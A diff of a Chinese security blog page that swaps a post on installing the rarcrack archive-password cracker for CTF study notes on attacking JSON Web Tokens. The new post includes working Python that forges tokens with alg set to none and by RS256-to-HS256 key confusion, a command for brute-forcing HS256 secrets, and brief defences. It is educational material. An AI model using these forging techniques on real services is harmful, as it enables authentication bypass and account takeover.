@@ -81,17 +81,20 @@
 
 
 
-<meta name="description" content="解决依赖报错问题">
+<meta name="description" content="最近这次国赛遇到了json web token的题目，发现并不能很顺利的做出来，于是写下这篇学习笔记">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Kali Linux rarcrack安装及使用">
-<meta property="og:url" content="https://xianyu123.me/2018/10/31/Kali-Linux-rarcrack安装及使用/index.html">
+<meta property="og:title" content="JWT(JSON Web Token) 攻击">
+<meta property="og:url" content="https://xianyu123.me/2019/07/09/JWT-JSON-Web-Token-攻击/index.html">
 <meta property="og:site_name" content="xianyu123&#39;s Blog">
-<meta property="og:description" content="解决依赖报错问题">
+<meta property="og:description" content="最近这次国赛遇到了json web token的题目，发现并不能很顺利的做出来，于是写下这篇学习笔记">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-05-20T11:27:46.162Z">
+<meta property="og:image" content="http://images.xianyu123.club/JWT1.png">
+<meta property="og:image" content="http://images.xianyu123.club/JWT2.png">
+<meta property="og:updated_time" content="2019-07-09T10:57:08.748Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Kali Linux rarcrack安装及使用">
-<meta name="twitter:description" content="解决依赖报错问题">
+<meta name="twitter:title" content="JWT(JSON Web Token) 攻击">
+<meta name="twitter:description" content="最近这次国赛遇到了json web token的题目，发现并不能很顺利的做出来，于是写下这篇学习笔记">
+<meta name="twitter:image" content="http://images.xianyu123.club/JWT1.png">
 
 
 
@@ -121,14 +124,14 @@
 
 
 
-  <link rel="canonical" href="https://xianyu123.me/2018/10/31/Kali-Linux-rarcrack安装及使用/">
+  <link rel="canonical" href="https://xianyu123.me/2019/07/09/JWT-JSON-Web-Token-攻击/">
 
 
 
 
 
 
-  <title>Kali Linux rarcrack安装及使用 | xianyu123's Blog</title>
+  <title>JWT(JSON Web Token) 攻击 | xianyu123's Blog</title>
   
 
 
@@ -295,7 +298,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://xianyu123.me/2018/10/31/Kali-Linux-rarcrack安装及使用/">
+    <link itemprop="mainEntityOfPage" href="https://xianyu123.me/2019/07/09/JWT-JSON-Web-Token-攻击/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="xianyu123">
@@ -312,7 +315,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Kali Linux rarcrack安装及使用</h1>
+          <h1 class="post-title" itemprop="name headline">JWT(JSON Web Token) 攻击</h1>
         
 
         <div class="post-meta">
@@ -324,8 +327,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-31T20:40:55+08:00">
-                2018-10-31
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-09T12:26:13+08:00">
+                2019-07-09
               </time>
             
 
@@ -347,8 +350,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Linux/" itemprop="url" rel="index">
-                    <span itemprop="name">Linux</span>
+                  <a href="/categories/Web-Security/" itemprop="url" rel="index">
+                    <span itemprop="name">Web Security</span>
                   </a>
                 </span>
 
@@ -365,8 +368,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2018/10/31/Kali-Linux-rarcrack安装及使用/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/2018/10/31/Kali-Linux-rarcrack安装及使用/" itemprop="commentCount"></span>
+                <a href="/2019/07/09/JWT-JSON-Web-Token-攻击/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2019/07/09/JWT-JSON-Web-Token-攻击/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -374,7 +377,7 @@
 
           
           
-             <span id="/2018/10/31/Kali-Linux-rarcrack安装及使用/" class="leancloud_visitors" data-flag-title="Kali Linux rarcrack安装及使用">
+             <span id="/2019/07/09/JWT-JSON-Web-Token-攻击/" class="leancloud_visitors" data-flag-title="JWT(JSON Web Token) 攻击">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -405,23 +408,72 @@
       
 
       
-        <p>解决依赖报错问题</p>
+        <p>最近这次国赛遇到了json web token的题目，发现并不能很顺利的做出来，于是写下这篇学习笔记</p>
 <a id="more"></a>
-<p><code>apt-get install rarcrack</code>时出现<code>依赖: initramfs-tools (&gt;= 0.120+deb8u2)</code>。</p>
-<p>解决方法：</p>
-<p>在终端输入<code>apt-get install -f</code>安装好依赖就行</p>
-<h1 id="安装rarcrack"><a href="#安装rarcrack" class="headerlink" title="安装rarcrack"></a>安装rarcrack</h1><p>具体的安装如下，更详细的说明请查看rarcrack官网<a href="http://rarcrack.sourceforge.net/" target="_blank" rel="noopener">rarcrack官网</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ tar -xjf rarcrack-VERSION.tar.bz2</span><br><span class="line">			$ cd rarcrack-VERSION</span><br><span class="line">			// you need gcc or any C compiler (edit Makefile CC=YOUR_C_COMPILER)</span><br><span class="line">			$ make</span><br><span class="line">			// you must be root in next step:</span><br><span class="line">			$ make install</span><br></pre></td></tr></table></figure>
-<h1 id="解决编译报错问题"><a href="#解决编译报错问题" class="headerlink" title="解决编译报错问题"></a>解决编译报错问题</h1><p>出现类型报错的解决如下。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread rarcrack.cxml2-config --libs --cflags-O2 -o rarcrack  </span><br><span class="line">/bin/sh: 1: xml2-config: not found  </span><br><span class="line">In file included from rarcrack.c:21:0:  </span><br><span class="line">rarcrack.h:25:48: 致命错误： libxml/xmlmemory.h：没有那个文件或目录  </span><br><span class="line">编译中断。  </span><br><span class="line">make: *** [all] 错误 1</span><br></pre></td></tr></table></figure>
-<p>解决方法：</p>
-<p>执行 <code>sudo apt-get install libxml2-dev libxslt-dev</code> 进行修复</p>
-<h1 id="使用rarcrack"><a href="#使用rarcrack" class="headerlink" title="使用rarcrack"></a>使用rarcrack</h1><p>参考<a href="https://www.bingyublog.com/2018/03/31/Linux%E4%B8%8B%E4%BD%BF%E7%94%A8rarcrack%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3RAR%EF%BC%8CZIP%EF%BC%8C7Z%E5%8E%8B%E7%BC%A9%E5%8C%85/" target="_blank" rel="noopener">Linux下使用rarcrack暴力破解RAR，ZIP，7Z压缩包</a></p>
-<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
-<li><a href="https://secretwiki.org/2017/05/30/kali-install/" target="_blank" rel="noopener">Kali Linux 安装笔记</a></li>
-<li><a href="https://tracker.pureos.net/w/troubleshooting/cryptsetup_setting_deprecated/" target="_blank" rel="noopener">CRYPTSETUP setting deprecated warning</a></li>
-<li><a href="https://ubuntuforums.org/showthread.php?t=1824343" target="_blank" rel="noopener">Thread: rarcrack installation error</a></li>
-</ul>
+<h1 id="什么是JWT"><a href="#什么是JWT" class="headerlink" title="什么是JWT"></a>什么是JWT</h1><p>JSON Web Token（JWT）是一个非常轻巧的规范。这个规范允许我们使用JWT在两个组织之间传递安全可靠的信息。</p>
+<p>现在网上大多数介绍JWT的文章实际介绍的都是JWS(JSON Web Signature),也往往导致了人们对于JWT的误解，但是JWT并不等于JWS，JWS只是JWT的一种实现，除了JWS外，JWE(JSON Web Encryption)也是JWT的一种实现。</p>
+<h1 id="JWT的组成"><a href="#JWT的组成" class="headerlink" title="JWT的组成"></a>JWT的组成</h1><p>我们随便来看一个：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJoZWxsbyIsImlhdCI6MTU2MjUwNDkxOCwiZXhwIjoxNTYyNTA0OTIzLCJhY2NvdW50Ijoia2sifQ.GqWnsUjzpqtE4GJrZ5Zim_nrwnQTGAlidoGqe3354yM</span><br></pre></td></tr></table></figure>
+<p>JWT的格式非常简单</p>
+<p>JWT的数据分为三个部分： <code>headers</code> , <code>payloads</code>，<code>signature(签名)</code></p>
+<p>三者通过<code>.</code>分割，均采用<code>base64编码</code></p>
+<h2 id="Headers"><a href="#Headers" class="headerlink" title="Headers"></a>Headers</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</span><br><span class="line"></span><br><span class="line">解码后为：</span><br><span class="line">&#123;</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;,</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>alg为算法的缩写，typ为类型的缩写，有时候还会有kid，kid表示算法所使用的密钥文件（当服务端需要多个密钥文件时使用）</p>
+<h2 id="Payloads"><a href="#Payloads" class="headerlink" title="Payloads"></a>Payloads</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">eyJpc3MiOiJoZWxsbyIsImlhdCI6MTU2MjUwNDkxOCwiZXhwIjoxNTYyNTA0OTIzLCJhY2NvdW50Ijoia2sifQ</span><br><span class="line"></span><br><span class="line">解码后为：</span><br><span class="line">&#123;</span><br><span class="line">  &quot;iss&quot;: &quot;hello&quot;,</span><br><span class="line">  &quot;iat&quot;: 1562504918,</span><br><span class="line">  &quot;exp&quot;: 1562504923,</span><br><span class="line">  &quot;account&quot;: &quot;kk&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这几个字段的含义如下，其中需要注意的字段是exp，这字段可在一定程度上被用来防止重放攻击</p>
+<p>iss(issuer)：发布者的url地址</p>
+<p>sub(subject)：该JWT所面向的用户，用于处理特定应用，不是常用的字段</p>
+<p>aud(audience)：接受者的url地址</p>
+<p>exp(expiration)：该jwt销毁的时间；unix时间戳</p>
+<p>nbf(not before)：该jwt的使用时间不能早于该时间；unix时间戳</p>
+<p>iat(issued at)：该jwt的发布时间；unix 时间戳</p>
+<p>jti(JWT ID)：该jwt的唯一ID编号</p>
+<h2 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GqWnsUjzpqtE4GJrZ5Zim_nrwnQTGAlidoGqe3354yM</span><br></pre></td></tr></table></figure>
+<p>因为header和payload是明文存储的，所以签名是为了防止数据被修改的，提供了对数据的交易功能<br>签名常使用RS256(RSA 非对称加密，使用私钥签名)、HS256(HMAC SHA256 对称加密)算法，签名对象为base64encode(headers) + ‘.’ + base64encode(payloads)</p>
+<h1 id="攻击JWT"><a href="#攻击JWT" class="headerlink" title="攻击JWT"></a>攻击JWT</h1><h2 id="1-敏感信息泄露"><a href="#1-敏感信息泄露" class="headerlink" title="1. 敏感信息泄露"></a>1. 敏感信息泄露</h2><p>很明显的一点，因为payload是明文传输的，所以如果payload中存在敏感信息就会出现信息泄露。当服务端的秘钥泄密的时候，JWT的伪造就变得非常简单容易。对此，服务端应该妥善保管好私钥，以免被他人窃取。</p>
+<h2 id="2-修改算法为none"><a href="#2-修改算法为none" class="headerlink" title="2. 修改算法为none"></a>2. 修改算法为none</h2><p>签名算法保证了JWT在传输的过程中不被恶意用户修改</p>
+<p>但是header中的alg字段可被修改为none</p>
+<p>一些JWT库支持none算法，即没有签名算法，当alg为none时后端不会进行签名校验</p>
+<p>将alg修改为none后，去掉JWT中的signature数据（仅剩header + ‘.’ + payload + ‘.’）然后提交到服务端即可</p>
+<p>这种攻击的例子可以参考：<a href="http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php" target="_blank" rel="noopener">http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php</a></p>
+<p>代码可以在Github上找到 <a href="https://github.com/Sjord/jwtdemo/" target="_blank" rel="noopener">https://github.com/Sjord/jwtdemo/</a></p>
+<p>这个例子的解法如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原headers:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</span></span><br><span class="line"><span class="comment"># 解码后:&#123;"typ": "JWT","alg": "HS256"&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 原payloads：eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTU2MjY2MjkyNSwiZXhwIjoxNTYyNjYzMDQ1LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0</span></span><br><span class="line"><span class="comment"># 解码后:&#123; "iss": "http://demo.sjoerdlangkemper.nl/", "iat": 1562662925,"exp": 1562663045,"data": &#123;"hello": "world"&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新构造新的</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">headers = <span class="string">"&#123;\"typ\":\"JWT\",\"alg\":\"none\"&#125;"</span></span><br><span class="line">payloads = <span class="string">"&#123;\"data\":\"test\"&#125;"</span></span><br><span class="line">bytesHeaders = headers.encode(encoding=<span class="string">"utf-8"</span>)</span><br><span class="line">encodeHead = base64.b64encode(bytesHeaders)</span><br><span class="line">bytesPay = payloads.encode(encoding=<span class="string">"utf-8"</span>)</span><br><span class="line">encodePay = base64.b64encode(bytesPay)</span><br><span class="line">print( encodeHead.decode()+ <span class="string">'.'</span> +encodePay.decode() + <span class="string">'.'</span>)</span><br></pre></td></tr></table></figure>
+<p>如何把得出的值传入到可控的参数中，可以看到<code>alg</code>已经被我们修改成了<code>none</code></p>
+<p><img src="http://images.xianyu123.club/JWT1.png" alt></p>
+<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ol>
+<li><p>不允许出现 none 的方法；</p>
+</li>
+<li><p>将开启 alg : none 作为一种额外的配置选项。</p>
+</li>
+</ol>
+<h2 id="3-将算法RS256修改为HS256（非对称密码算法-gt-对称密码算法）"><a href="#3-将算法RS256修改为HS256（非对称密码算法-gt-对称密码算法）" class="headerlink" title="3. 将算法RS256修改为HS256（非对称密码算法=&gt;对称密码算法）"></a>3. 将算法RS256修改为HS256（非对称密码算法=&gt;对称密码算法）</h2><p>算法HS256使用秘密密钥对每条消息进行签名和验证。</p>
+<p>算法RS256使用私钥对消息进行签名，并使用公钥进行验证。</p>
+<p>如果将算法从RS256更改为HS256，后端代码会使用公钥作为秘密密钥，然后使用HS256算法验证签名。</p>
+<p>由于公钥有时可以被攻击者获取到，所以攻击者可以修改header中算法为HS256，然后使用RSA公钥对数据进行签名。</p>
+<p>后端代码会使用RSA公钥+HS256算法进行签名验证。</p>
+<p>同样的，可以通过一个例子来理解这种攻击方式 <a href="http://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php" target="_blank" rel="noopener">http://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php</a></p>
+<p>RSA公钥：<a href="http://demo.sjoerdlangkemper.nl/jwtdemo/public.pem" target="_blank" rel="noopener">http://demo.sjoerdlangkemper.nl/jwtdemo/public.pem</a></p>
+<p>这个例子的解法如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原headers:eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9</span></span><br><span class="line"><span class="comment"># 解码后:&#123;"typ": "JWT", "alg": "RS256"&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 原payloads：eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTU2MjY2NzkwMSwiZXhwIjoxNTYyNjY4MDIxLCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0</span></span><br><span class="line"><span class="comment"># 解码后:&#123;"iss": "http://demo.sjoerdlangkemper.nl/","iat": 1562667901,"exp": 1562668021,"data": &#123;"hello": "world"&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新构造：</span></span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="comment"># public.pem从上面的公钥地址下载，一般ctf比赛中都会有公钥泄漏可以下载的</span></span><br><span class="line">public = open(<span class="string">'public.pem'</span>, <span class="string">'r'</span>).read()</span><br><span class="line">print(jwt.encode(&#123;<span class="string">"data"</span>:<span class="string">"test"</span>&#125;, key=public, algorithm=<span class="string">'HS256'</span>))</span><br></pre></td></tr></table></figure>
+<p>如何把得出的值传入到可控的参数中，可以看到我们绕过了<code>RS256</code>算法，把它变成了<code>HS256</code>算法，且数据可控</p>
+<p><img src="http://images.xianyu123.club/JWT2.png" alt></p>
+<h2 id="4-HS256（对称加密）密钥破解"><a href="#4-HS256（对称加密）密钥破解" class="headerlink" title="4. HS256（对称加密）密钥破解"></a>4. HS256（对称加密）密钥破解</h2><p>如果HS256密钥强度较弱，则可以直接强制使用，通过爆破 HS256的秘钥可以完成该操作。难度比较低。</p>
+<p>破解工具<a href="https://github.com/brendan-rius/c-jwt-cracker*" target="_blank" rel="noopener">c-jwt-cracker</a></p>
+<p>使用方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJMM3l4IiwiaWF0IjoxNTYyNTA0OTE4LCJleHAiOjE1NjI1MDQ5MjMsImFjY291bnQiOiJrayJ9.CJcfvv6JbajrhNriA2-Hb_2yYCUy5aeAvUjVzdgBytw</span><br></pre></td></tr></table></figure>
+<h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h3><p>使用复杂的秘钥即可</p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ol>
+<li><a href="https://www.jianshu.com/p/50ade6f2e4fd" target="_blank" rel="noopener">一篇文章带你分清楚JWT,JWS与JWE</a></li>
+<li><p><a href="https://www.anquanke.com/post/id/145540" target="_blank" rel="noopener">Json Web Token历险记</a></p>
+</li>
+<li><p><a href="https://www.cnblogs.com/dliv3/p/7450057.html" target="_blank" rel="noopener">Hacking JWT(JSON Web Token)</a></p>
+</li>
+<li><p><a href="https://xz.aliyun.com/t/2338" target="_blank" rel="noopener">JSON Web Token (JWT) 攻击技巧</a></p>
+</li>
+<li><a href="https://www.freebuf.com/articles/web/180874.html" target="_blank" rel="noopener">深入了解Json Web Token之概念篇</a></li>
+<li><a href="https://www.freebuf.com/articles/web/181261.html" target="_blank" rel="noopener">深入了解Json Web Token之实战篇</a></li>
+</ol>
 
       
     </div>
@@ -438,12 +490,12 @@
   <!-- JS库 sweetalert 可修改路径 -->
   <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
   <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
-  <p><span>本文标题:</span><a href="/2018/10/31/Kali-Linux-rarcrack安装及使用/">Kali Linux rarcrack安装及使用</a></p>
+  <p><span>本文标题:</span><a href="/2019/07/09/JWT-JSON-Web-Token-攻击/">JWT(JSON Web Token) 攻击</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 xianyu123 的个人博客">xianyu123</a></p>
-  <p><span>发布时间:</span>2018年10月31日 - 20:40</p>
-  <p><span>最后更新:</span>2019年05月20日 - 19:27</p>
-  <p><span>原始链接:</span><a href="/2018/10/31/Kali-Linux-rarcrack安装及使用/" title="Kali Linux rarcrack安装及使用">https://xianyu123.me/2018/10/31/Kali-Linux-rarcrack安装及使用/</a>
-    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://xianyu123.me/2018/10/31/Kali-Linux-rarcrack安装及使用/" aria-label="复制成功！"></i></span>
+  <p><span>发布时间:</span>2019年07月09日 - 12:26</p>
+  <p><span>最后更新:</span>2019年07月09日 - 18:57</p>
+  <p><span>原始链接:</span><a href="/2019/07/09/JWT-JSON-Web-Token-攻击/" title="JWT(JSON Web Token) 攻击">https://xianyu123.me/2019/07/09/JWT-JSON-Web-Token-攻击/</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://xianyu123.me/2019/07/09/JWT-JSON-Web-Token-攻击/" aria-label="复制成功！"></i></span>
   </p>
   <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
 </div>
@@ -495,8 +547,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/10/25/php文件包含漏洞/" rel="next" title="浅谈php文件包含漏洞">
-                <i class="fa fa-chevron-left"></i> 浅谈php文件包含漏洞
+              <a href="/2019/05/28/mac下安装多版本php和配置php-fpm的一些坑/" rel="next" title="mac下安装多版本php和配置php-fpm的一些坑">
+                <i class="fa fa-chevron-left"></i> mac下安装多版本php和配置php-fpm的一些坑
               </a>
             
           </div>
@@ -505,8 +557,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2018/12/07/php变量覆盖漏洞/" rel="prev" title="php变量覆盖漏洞">
-                php变量覆盖漏洞 <i class="fa fa-chevron-right"></i>
+              <a href="/2019/07/09/hash扩展攻击/" rel="prev" title="hash扩展攻击">
+                hash扩展攻击 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -674,7 +726,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#安装rarcrack"><span class="nav-number">1.</span> <span class="nav-text">安装rarcrack</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#解决编译报错问题"><span class="nav-number">2.</span> <span class="nav-text">解决编译报错问题</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#使用rarcrack"><span class="nav-number">3.</span> <span class="nav-text">使用rarcrack</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reference"><span class="nav-number">4.</span> <span class="nav-text">Reference</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#什么是JWT"><span class="nav-number">1.</span> <span class="nav-text">什么是JWT</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JWT的组成"><span class="nav-number">2.</span> <span class="nav-text">JWT的组成</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Headers"><span class="nav-number">2.1.</span> <span class="nav-text">Headers</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Payloads"><span class="nav-number">2.2.</span> <span class="nav-text">Payloads</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Signature"><span class="nav-number">2.3.</span> <span class="nav-text">Signature</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#攻击JWT"><span class="nav-number">3.</span> <span class="nav-text">攻击JWT</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-敏感信息泄露"><span class="nav-number">3.1.</span> <span class="nav-text">1. 敏感信息泄露</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-修改算法为none"><span class="nav-number">3.2.</span> <span class="nav-text">2. 修改算法为none</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#防御"><span class="nav-number">3.2.1.</span> <span class="nav-text">防御</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-将算法RS256修改为HS256（非对称密码算法-gt-对称密码算法）"><span class="nav-number">3.3.</span> <span class="nav-text">3. 将算法RS256修改为HS256（非对称密码算法=&gt;对称密码算法）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-HS256（对称加密）密钥破解"><span class="nav-number">3.4.</span> <span class="nav-text">4. HS256（对称加密）密钥破解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#防御-1"><span class="nav-number">3.4.1.</span> <span class="nav-text">防御</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reference"><span class="nav-number">4.</span> <span class="nav-text">Reference</span></a></li></ol></div>
             
 
           </div>
